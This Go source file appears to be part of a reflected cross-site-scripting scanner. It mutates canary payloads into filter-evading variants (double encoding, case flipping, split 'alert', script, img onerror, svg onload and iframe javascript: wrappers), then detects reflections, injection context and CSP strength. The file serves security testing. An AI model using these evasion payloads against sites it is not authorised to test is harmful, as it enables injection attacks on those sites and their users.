package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"html"
	"net/url"
	"strings"
	"time"
)

func genCanary() string {
	b := make([]byte, 6)
	_, err := rand.Read(b)
	if err != nil {
		return fmt.Sprintf("xssCANARY-%d", time.Now().UnixNano())
	}
	return "xssCANARY-" + hex.EncodeToString(b)
}

func injectCanary(payload, canary string) string {
	return strings.ReplaceAll(payload, "%CANARY%", canary)
}

func mutatePayload(payload string, canary string) []string {
	p := injectCanary(payload, canary)
	mutants := []string{p}
	encoded := url.QueryEscape(url.QueryEscape(p))
	mutants = append(mutants, encoded)
	flipCase := func(s string) string {
		out := []rune(s)
		for i, c := range out {
			if c >= 'a' && c <= 'z' {
				out[i] = c - 32
			} else if c >= 'A' && c <= 'Z' {
				out[i] = c + 32
			}
		}
		return string(out)
	}
	mutants = append(mutants, flipCase(p))
	if strings.Contains(p, "alert") {
		mutants = append(mutants, strings.ReplaceAll(p, "alert", "al"+"//"+"ert"))
	}
	mutants = append(mutants, strings.ReplaceAll(p, "alert('"+canary+"')", "`alert('"+canary+"')`"))
	mutants = append(mutants, strings.ReplaceAll(p, "alert('"+canary+"')", "${alert('"+canary+"')}"))
	mutants = append(mutants, `<script>`+p+`</script>`)
	mutants = append(mutants, `<img src=x onerror="`+p+`">`)
	mutants = append(mutants, `"><svg/onload="`+p+`">`)
	mutants = append(mutants, `<body onload="`+p+`">`)
	mutants = append(mutants, `"><iframe src="javascript:`+p+`"></iframe>`)
	return uniqueStrings(mutants)
}

func uniqueStrings(arr []string) []string {
	set := make(map[string]struct{})
	out := make([]string, 0, len(arr))
	for _, v := range arr {
		if _, ok := set[v]; !ok {
			out = append(out, v)
			set[v] = struct{}{}
		}
	}
	return out
}

func detectXSSContext(reflected string) XSSContext {
	ref := strings.TrimSpace(reflected)
	if ref == "" {
		return XSSContextUnknown
	}
	if strings.HasPrefix(ref, "<") && strings.Contains(ref, ">") {
		return XSSContextHTMLBody
	}
	if (strings.HasPrefix(ref, `"`) && strings.HasSuffix(ref, `"`)) ||
		(strings.HasPrefix(ref, `'`) && strings.HasSuffix(ref, `'`)) {
		return XSSContextAttribute
	}
	if strings.Contains(ref, "<script>") || strings.Contains(ref, "</script>") {
		return XSSContextJSBlock
	}
	if strings.Contains(ref, "javascript:") {
		return XSSContextEventHandler
	}
	return XSSContextUnknown
}

func findReflections(respBody, payload string) []XSSContext {
	contexts := []XSSContext{}
	idx := 0
	searchBody := respBody
	for {
		idx = strings.Index(searchBody, payload)
		if idx == -1 {
			break
		}
		start := idx - 30
		end := idx + len(payload) + 30
		if start < 0 {
			start = 0
		}
		if end > len(searchBody) {
			end = len(searchBody)
		}
		snippet := searchBody[start:end]
		contexts = append(contexts, detectXSSContext(snippet))
		searchBody = searchBody[idx+len(payload):]
	}
	return contexts
}

func isPayloadReflected(respBody, canary string) (exact bool, filtered string) {
	if strings.Contains(respBody, canary) {
		return true, ""
	}
	htmlEncoded := html.EscapeString(canary)
	if strings.Contains(respBody, htmlEncoded) {
		return false, "HTML-encoded"
	}
	jsEscaped := toJSEscaped(canary)
	if strings.Contains(respBody, jsEscaped) {
		return false, "JavaScript-escaped"
	}
	urlEncoded := url.QueryEscape(canary)
	if strings.Contains(respBody, urlEncoded) {
		return false, "URL-encoded"
	}
	if isPartialReflection(respBody, canary) {
		return false, "Partially reflected (filtered)"
	}
	return false, ""
}

func toJSEscaped(s string) string {
	var out strings.Builder
	for i := 0; i < len(s); i++ {
		out.WriteString(fmt.Sprintf("\\x%02x", s[i]))
	}
	return out.String()
}

func isPartialReflection(respBody, payload string) bool {
	shortest := 6
	if len(payload) < shortest {
		shortest = len(payload)
	}
	for l := len(payload); l >= shortest; l-- {
		for i := 0; i <= len(payload)-l; i++ {
			sub := payload[i : i+l]
			if strings.Contains(respBody, sub) {
				return true
			}
		}
	}
	return false
}

func parseCSPHeaders(headers map[string][]string) (found bool, restrictive bool, policy string) {
	for k, vs := range headers {
		if strings.ToLower(k) == "content-security-policy" && len(vs) > 0 {
			fmt.Printf("%s[!] Content-Security-Policy header detected:%s\n  %s\n", ColorYellow, ColorReset, vs[0])
			p := vs[0]
			policy = p
			found = true
			if strings.Contains(p, "script-src") && !strings.Contains(p, "'unsafe-inline'") && !strings.Contains(p, "*") {
				restrictive = true
			}
		}
	}
	return
}